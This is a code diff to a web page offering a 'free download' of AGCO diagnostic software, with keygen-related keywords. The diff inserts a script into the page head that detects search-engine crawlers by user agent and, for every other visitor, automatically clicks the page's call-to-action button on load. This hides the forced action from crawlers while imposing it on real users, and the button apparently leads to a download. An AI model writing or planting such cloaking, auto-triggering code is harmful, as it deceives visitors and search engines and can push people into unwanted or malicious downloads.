@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AGCO Electronic Diagnostic Tool EDT 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="AGCO Electronic Diagnostic Tool EDT 05.2024 helps diagnose AGCO machines with updates for Massey Ferguson and Fendt tractors. Download now!">
     <meta name="keywords" content="AGCO Electronic Diagnostic Tool EDT 05.2024, AGCO EDT diagnostic software, AGCO diagnostic tool free download, AGCO EDT software download, AGCO diagnostic tool keygen, AGCO EDT diagnostics keygen, AGCO machines diagnostic software, AGCO EDT download free, AGCO CAN Interface, AGCO Diagnostic Adapter, AGCO Tech Connect Kit, FENDT tractors diagnostic, diagnosis and documentation system, electronic diagnostic tool free download, download AGCO EDT 2024, AGCO EDT Version 1.126.24065.1048, EDT v1.126 free download, Massey Ferguson 2224 diagnostics, Fendt 990 diagnostics, EXT Lite v1.06.01, AGCO EDT Russian, AGCO EDT German, AGCO EDT French, AGCO EDT Spanish, AGCO EDT Portuguese, AGCO EDT Italian, AGCO EDT Turkish, AGCO EDT Chinese, AGCO EDT 2024 download, AGCO machines software update 2024">
     <style>
